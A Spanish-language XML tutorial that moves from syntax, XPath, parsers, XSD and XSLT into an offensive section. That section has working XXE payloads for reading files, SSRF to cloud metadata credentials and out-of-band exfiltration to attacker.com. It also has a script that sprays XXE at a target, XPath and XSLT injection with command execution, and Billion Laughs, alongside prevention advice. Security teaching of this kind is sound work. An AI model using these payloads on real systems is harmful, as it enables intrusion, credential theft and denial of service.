# XML — General y Hacking Ético

XML es un formato de datos ampliamente utilizado en APIs, configuraciones, documentos y comunicaciones entre servicios. Su mala configuración genera vulnerabilidades críticas como XXE que permiten leer archivos internos, realizar SSRF y ejecutar código.

---

## 1. Fundamentos de XML

### Estructura básica

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!-- Declaración XML (opcional pero recomendada) -->

<raiz>
  <elemento atributo="valor">Contenido de texto</elemento>
  <otro id="1">
    <hijo>Texto hijo</hijo>
  </otro>
  <!-- Comentario XML -->
  <vacio/>  <!-- Elemento vacío (auto-cerrado) -->
</raiz>
```

### Reglas esenciales

```xml
<!-- Todos los elementos deben tener etiqueta de cierre -->
<correcto>texto</correcto>
<selfclose/>

<!-- Los atributos deben ir entre comillas -->
<img src="foto.png" alt="mi foto"/>

<!-- Los nombres son case-sensitive -->
<Nombre>Alice</Nombre>   <!-- distinto de <nombre> -->

<!-- Un único elemento raíz -->
<?xml version="1.0"?>
<root>
  <a/>
  <b/>
</root>

<!-- Caracteres especiales requieren entidades -->
&lt;   →  <
&gt;   →  >
&amp;  →  &
&apos; →  '
&quot; →  "

<!-- CDATA: bloque de texto literal (sin escapar) -->
<script><![CDATA[
  if (a < b && c > d) { return true; }
]]></script>
```

### Namespaces

```xml
<?xml version="1.0"?>
<soap:Envelope
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">

  <soap:Header/>
  <soap:Body>
    <m:GetUser xmlns:m="http://example.com/users">
      <m:id>42</m:id>
    </m:GetUser>
  </soap:Body>

</soap:Envelope>
```

---

## 2. DTD — Document Type Definition

El DTD define la estructura válida de un documento XML. Es la **base del ataque XXE**.

```xml
<!-- DTD interno (dentro del propio documento) -->
<?xml version="1.0"?>
<!DOCTYPE nota [
  <!ELEMENT nota (para, de, asunto, cuerpo)>
  <!ELEMENT para    (#PCDATA)>
  <!ELEMENT de      (#PCDATA)>
  <!ELEMENT asunto  (#PCDATA)>
  <!ELEMENT cuerpo  (#PCDATA)>
  <!ATTLIST nota tipo CDATA "personal">
]>
<nota tipo="trabajo">
  <para>Alice</para>
  <de>Bob</de>
  <asunto>Reunión</asunto>
  <cuerpo>A las 10h</cuerpo>
</nota>

<!-- DTD externo -->
<!DOCTYPE nota SYSTEM "nota.dtd">
<!DOCTYPE nota PUBLIC "-//W3C//DTD XHTML 1.0//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<!-- Entidades en DTD -->
<!ENTITY nombre "Alice">               <!-- entidad interna -->
<!ENTITY datos SYSTEM "datos.txt">    <!-- entidad externa (vector XXE) -->
<!ENTITY url   SYSTEM "http://host/"> <!-- entidad externa HTTP -->

<!-- Entidades de parámetro (solo usables dentro del DTD) -->
<!ENTITY % parametro "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%datos;'>">
```

---

## 3. XPath — Navegación y Consultas

```xml
<!-- Documento de ejemplo -->
<biblioteca>
  <libro id="1" genero="novela">
    <titulo>Don Quijote</titulo>
    <autor>Cervantes</autor>
    <precio>15.99</precio>
  </libro>
  <libro id="2" genero="tecnico">
    <titulo>Clean Code</titulo>
    <autor>Martin</autor>
    <precio>39.99</precio>
  </libro>
</biblioteca>
```

```xpath
/biblioteca                          Nodo raíz biblioteca
/biblioteca/libro                    Todos los libros
//libro                              Todos los libro en cualquier nivel
//libro[@id='1']                     Libro con atributo id=1
//libro[@genero='novela']            Libros de genero novela
//libro/titulo/text()                Texto de los títulos
//libro[precio > 20]                 Libros con precio > 20
//libro[1]                           Primer libro (XPath es 1-indexed)
//libro[last()]                      Último libro
//libro[position() <= 2]             Primeros 2 libros
//@id                                Todos los atributos id
//libro[contains(titulo,'Code')]     Título contiene "Code"
//libro[starts-with(autor,'M')]      Autor empieza por M
count(//libro)                       Número de libros
//libro/titulo | //libro/autor       Unión: títulos Y autores
```

### XPath en Python

```python
from lxml import etree

tree = etree.parse("biblioteca.xml")
root = tree.getroot()

# Consultas XPath
libros = root.xpath("//libro")
for libro in libros:
    titulo = libro.find("titulo").text
    precio = libro.find("precio").text
    print(f"{titulo}: {precio}€")

# Con namespace
ns = {"s": "http://schemas.xmlsoap.org/soap/envelope/"}
body = root.xpath("//s:Body", namespaces=ns)

# Modificar y guardar
nuevo = etree.SubElement(root, "libro")
nuevo.set("id", "3")
titulo = etree.SubElement(nuevo, "titulo")
titulo.text = "Nuevo Libro"
tree.write("salida.xml", pretty_print=True, xml_declaration=True, encoding="UTF-8")
```

---

## 4. Parsers XML en Python

```python
# ── ElementTree (stdlib) ─────────────────────────────────────────────────────
import xml.etree.ElementTree as ET

tree = ET.parse("archivo.xml")
root = tree.getroot()

# Navegar
print(root.tag)                  # tag del elemento raíz
print(root.attrib)               # dict de atributos
for child in root:
    print(child.tag, child.text)

root.find("libro")               # primer hijo con ese tag
root.findall("libro")            # todos
root.findall(".//precio")        # descendientes recursivos
root.get("id")                   # valor de atributo

# Crear XML
root = ET.Element("raiz")
hijo = ET.SubElement(root, "hijo", attrib={"id": "1"})
hijo.text = "contenido"
tree = ET.ElementTree(root)
ET.indent(tree, space="  ")      # Python 3.9+
tree.write("salida.xml", encoding="unicode", xml_declaration=True)

# ── lxml (más potente) ────────────────────────────────────────────────────────
from lxml import etree

root   = etree.fromstring(b"<root><child id='1'>texto</child></root>")
child  = root.find("child")
print(etree.tostring(root, pretty_print=True).decode())

# Parsear desde string/bytes
xml_str = b"""<?xml version="1.0"?><root><item>a</item></root>"""
root    = etree.fromstring(xml_str)

# Validar contra un schema XSD
xsd_doc = etree.parse("schema.xsd")
schema  = etree.XMLSchema(xsd_doc)
doc     = etree.parse("documento.xml")
if not schema.validate(doc):
    print(schema.error_log)

# ── minidom (para output formateado) ─────────────────────────────────────────
from xml.dom import minidom
xml_str = minidom.parseString(ET.tostring(root)).toprettyxml(indent="  ")
```

---

## 5. SOAP y REST XML

```python
# Petición SOAP (Web Service)
import requests

soap_body = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://ejemplo.com/users">
      <UserId>1</UserId>
    </GetUser>
  </soap:Body>
</soap:Envelope>"""

headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction":   "http://ejemplo.com/users/GetUser"
}

r = requests.post("http://webservice.com/service.asmx",
                  data=soap_body, headers=headers)

# Parsear respuesta SOAP
from lxml import etree
root = etree.fromstring(r.content)
ns   = {"s": "http://schemas.xmlsoap.org/soap/envelope/",
        "u": "http://ejemplo.com/users"}
result = root.xpath("//u:GetUserResult/text()", namespaces=ns)
print(result)
```

---

## 6. Hacking Ético — XXE (XML External Entity)

### 6.1 Conceptos Clave

XXE ocurre cuando un parser XML procesa entidades externas definidas por el usuario. Permite:
- **Leer archivos del servidor** (`file://`)
- **SSRF** hacia servicios internos (`http://`)
- **Exfiltración out-of-band** (OOB)
- **Denegación de servicio** (Billion Laughs)

### 6.2 XXE Básico — Leer Archivos

```xml
<!-- Payload básico — leer /etc/passwd -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <user>&xxe;</user>
</data>

<!-- Windows — leer archivos del sistema -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
]>

<!-- Leer código fuente de la aplicación -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>

<!-- Con wrapper PHP (base64 para evitar errores de encoding) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
```

### 6.3 XXE SSRF — Acceder a Servicios Internos

```xml
<!-- SSRF a metadata de AWS -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<data>&xxe;</data>

<!-- SSRF a puerto interno -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">
]>

<!-- SSRF a Redis -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "dict://localhost:6379/info">
]>

<!-- SSRF a SMB (capturar hash NTLMv2) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "\\attacker.com\share">
]>
```

### 6.4 XXE Blind — Out-of-Band (OOB)

Cuando la respuesta no muestra el contenido directamente (blind XXE):

```xml
<!-- Paso 1: DTD malicioso en el servidor del atacante (evil.dtd) -->
<!ENTITY % archivo SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY enviar SYSTEM 'http://attacker.com/?d=%archivo;'>">
%exfil;

<!-- Paso 2: Payload enviado al objetivo -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&enviar;</data>

<!-- Listener en el atacante para recibir la exfiltración -->
<!-- python3 -m http.server 80 -->
<!-- Ver en los logs: GET /?d=root:x:0:0:root:/root:/bin/bash... -->
```

### 6.5 XXE Error-Based

```xml
<!-- Si el servidor muestra errores XML, podemos leer archivos via mensajes de error -->
<!-- evil.dtd en el atacante: -->
<!ENTITY % archivo SYSTEM "file:///etc/passwd">
<!ENTITY % error "<!ENTITY &#37; boom SYSTEM 'file:///INEXISTENTE/%archivo;'>">
%error;
%boom;

<!-- El error incluirá el contenido del archivo en el mensaje -->
```

### 6.6 XXE en JSON/Content-Type Switching

```python
import requests

# Muchos endpoints aceptan XML aunque esperen JSON
# Intentar cambiar Content-Type a XML

payload_xxe = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>"""

# Probar con distintos Content-Types
content_types = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/atom+xml",
    "application/rss+xml",
]

for ct in content_types:
    r = requests.post("https://target.com/api/endpoint",
                      data=payload_xxe,
                      headers={"Content-Type": ct},
                      verify=False)
    if "root:" in r.text or "bin/bash" in r.text:
        print(f"[+] XXE con Content-Type: {ct}")
        print(r.text[:500])
```

### 6.7 XXE en Formatos que Usan XML

```python
# ── SVG Upload → XXE ─────────────────────────────────────────────────────────
# Los archivos SVG son XML y pueden contener entidades externas

svg_xxe = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>"""

# Subir como imagen.svg y ver si el servidor procesa el SVG

# ── DOCX/XLSX/PPTX → XXE ────────────────────────────────────────────────────
# Los archivos Office son ZIPs con XML interno
# Modificar word/document.xml o xl/sharedStrings.xml

import zipfile, shutil, os

def inject_xxe_docx(input_docx, output_docx, xxe_payload):
    shutil.copy(input_docx, output_docx)
    with zipfile.ZipFile(output_docx, "a") as zf:
        # Sobrescribir word/document.xml con XXE inyectado
        content = zf.read("word/document.xml").decode()
        # Añadir DOCTYPE con la entidad antes de <w:document>
        malicious = content.replace(
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n' + xxe_payload
        )
        zf.writestr("word/document.xml", malicious)

# ── PDF → XXE (vía herramientas que procesan PDFs con libxml) ────────────────
# Algunos procesadores de PDF usan libxml2 internamente
# Intentar incrustar XML en campos de metadatos del PDF

# ── SAML → XXE ───────────────────────────────────────────────────────────────
# SAML es XML firmado — si la firma no protege las entidades externas:
saml_xxe = """<?xml version="1.0"?>
<!DOCTYPE samlp:AuthnRequest [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:AuthnRequest xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:AuthnRequest>"""
```

### 6.8 XPath Injection

```python
# ✗ VULNERABLE — construir XPath con input del usuario sin sanitizar
def get_user(username, password):
    xml_doc = ET.parse("users.xml")
    query   = f"//user[name='{username}' and password='{password}']"
    return xml_doc.getroot().findall(query)

# Payloads de inyección XPath:
# username: ' or '1'='1          → siempre verdadero
# username: admin' or '1'='1     → login bypass como admin
# username: ' or 1=1 or 'a'='b   → todos los usuarios
# username: '] | //user[name='   → variante con |

# Extraer datos con XPath Injection (boolean-based)
# Si preguntamos: ¿El primer carácter del password del admin es 'a'?
# Payload: admin' and substring(password,1,1)='a' and '1'='1
# → si devuelve resultado: el char es 'a'

# ✓ Mitigación: usar variables en XPath
def get_user_safe(xml_doc, username, password):
    root = xml_doc.getroot()
    for user in root.findall("user"):
        if (user.findtext("name") == username and
                user.findtext("password") == password):
            return user
    return None
```

### 6.9 Billion Laughs — DoS por Expansión de Entidades

```xml
<!-- Ataque de denegación de servicio por expansión exponencial de entidades -->
<!-- Cada entidad referencia a la anterior, causando expansión exponencial -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol  "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
<!-- lol9 se expande a 10^9 = 1 billón de "lol" → ~3GB de RAM -->
```

### 6.10 Herramientas para XXE

```bash
# Detectar y explotar XXE automáticamente
# XXEinjector
ruby XXEinjector.rb --host=attacker.com --httpport=80 \
  --file=/tmp/request.txt --path=/etc/passwd --oob=http

# Payloads de Burp Suite Collaborator
# Activar Burp Collaborator y usar la URL como destino OOB

# xmllint — validar y parsear XML desde CLI
xmllint --noout documento.xml     # validar (sin output)
xmllint --format documento.xml    # formatear
xmllint --xpath "//user/name/text()" documento.xml  # query XPath
xmllint --dtdvalid schema.dtd documento.xml         # validar contra DTD

# Detectar parsers vulnerables
# Enviar Billion Laughs y ver si el servidor tarda más de lo normal
# Enviar XXE a /etc/passwd y verificar en la respuesta

# xmlstarlet — manipulación XML desde CLI
xmlstarlet sel -t -v "//libro/titulo" biblioteca.xml   # XPath query
xmlstarlet ed -u "//libro[1]/precio" -v "9.99" xml     # editar valor
xmlstarlet val --dtd schema.dtd documento.xml           # validar
```

---

## 7. Prevención de XXE

```python
# ── Python: deshabilitar entidades externas ───────────────────────────────────

# ElementTree (seguro por defecto en Python 3.8+)
# Pero hay que usar defusedxml para máxima seguridad
import defusedxml.ElementTree as ET   # pip install defusedxml
tree = ET.parse("archivo.xml")        # rechaza XXE, Billion Laughs, etc.

# lxml: deshabilitar entidades externas
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,   # no resolver entidades externas
    no_network=True,          # no hacer peticiones de red
    load_dtd=False,           # no cargar DTDs externos
    dtd_validation=False
)
tree = etree.parse("archivo.xml", parser)

# ── Configuración segura general ──────────────────────────────────────────────
# Java (SAXParserFactory)
# factory.setFeature("http://xml.org/sax/features/external-general-entities", false)
# factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false)

# PHP (libxml)
# libxml_disable_entity_loader(true);  // PHP < 8.0
// En PHP 8.0+ está deshabilitado por defecto

# .NET
# XmlReaderSettings settings = new XmlReaderSettings();
# settings.DtdProcessing = DtdProcessing.Prohibit;

# Medidas de defensa en profundidad
# 1. Deshabilitar DTD y entidades externas en el parser
# 2. Usar WAF con reglas para detectar payloads XXE
# 3. Principio de mínimo privilegio al proceso del servidor
# 4. Filtrar input antes de pasarlo al parser
# 5. Actualizar librerías de parsing XML regularmente
```

---

## 8. XSD — XML Schema Definition

```xml
<!-- schema.xsd: define la estructura válida de usuarios.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">

  <xs:element name="usuarios">
    <xs:complexType>
      <xs:sequence>
        <xs:element name="usuario" maxOccurs="unbounded">
          <xs:complexType>
            <xs:sequence>
              <xs:element name="nombre" type="xs:string"/>
              <xs:element name="email"  type="xs:string"/>
              <xs:element name="edad"   type="xs:integer" minOccurs="0"/>
            </xs:sequence>
            <xs:attribute name="id"   type="xs:positiveInteger" use="required"/>
            <xs:attribute name="rol"  use="optional" default="user">
              <xs:simpleType>
                <xs:restriction base="xs:string">
                  <xs:enumeration value="admin"/>
                  <xs:enumeration value="user"/>
                  <xs:enumeration value="guest"/>
                </xs:restriction>
              </xs:simpleType>
            </xs:attribute>
          </xs:complexType>
        </xs:element>
      </xs:sequence>
    </xs:complexType>
  </xs:element>

</xs:schema>
```

```python
# Validar documento contra XSD
from lxml import etree

schema_doc = etree.parse("schema.xsd")
schema     = etree.XMLSchema(schema_doc)
doc        = etree.parse("usuarios.xml")

if schema.validate(doc):
    print("Documento válido")
else:
    for error in schema.error_log:
        print(f"Error en línea {error.line}: {error.message}")
```

---

## 9. XSLT — Transformaciones XML

```xml
<!-- estilo.xsl: transformar XML a HTML -->
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">

  <xsl:template match="/">
    <html>
      <body>
        <h2>Catálogo de Libros</h2>
        <table border="1">
          <tr><th>Título</th><th>Autor</th><th>Precio</th></tr>
          <xsl:for-each select="biblioteca/libro">
            <xsl:sort select="precio" data-type="number"/>
            <tr>
              <td><xsl:value-of select="titulo"/></td>
              <td><xsl:value-of select="autor"/></td>
              <td><xsl:value-of select="precio"/></td>
            </tr>
          </xsl:for-each>
        </table>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
```

```python
# Aplicar XSLT en Python
from lxml import etree

xml_doc  = etree.parse("biblioteca.xml")
xsl_doc  = etree.parse("estilo.xsl")
transform = etree.XSLT(xsl_doc)
result   = transform(xml_doc)
print(str(result))

# ── XSLT Injection ────────────────────────────────────────────────────────────
# Si el servidor permite al usuario proporcionar una hoja XSLT,
# un atacante puede ejecutar funciones del sistema
xslt_injection = """<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
  extension-element-prefixes="rt">
  <xsl:template match="/">
    <xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>
  </xsl:template>
</xsl:stylesheet>"""
# Aplica solo en procesadores Java (Xalan, Saxon) que permiten extensiones
```

---

## 10. Referencia Rápida de Payloads XXE

```
Leer archivo local:
  <!ENTITY xxe SYSTEM "file:///etc/passwd">

Leer archivo Windows:
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">

SSRF AWS metadata:
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">

SSRF interno:
  <!ENTITY xxe SYSTEM "http://localhost:8080/admin/env">

PHP wrapper base64:
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">

Expect wrapper (RCE):
  <!ENTITY xxe SYSTEM "expect://id">

Netdoc (Java):
  <!ENTITY xxe SYSTEM "netdoc:///etc/passwd">

Blind OOB HTTP:
  <!ENTITY % file   SYSTEM "file:///etc/passwd">
  <!ENTITY % oob    "<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%file;'>">

Billion Laughs (DoS):
  <!ENTITY a "aaa...">  <!ENTITY b "&a;&a;..."> ... (expansión exponencial)
```
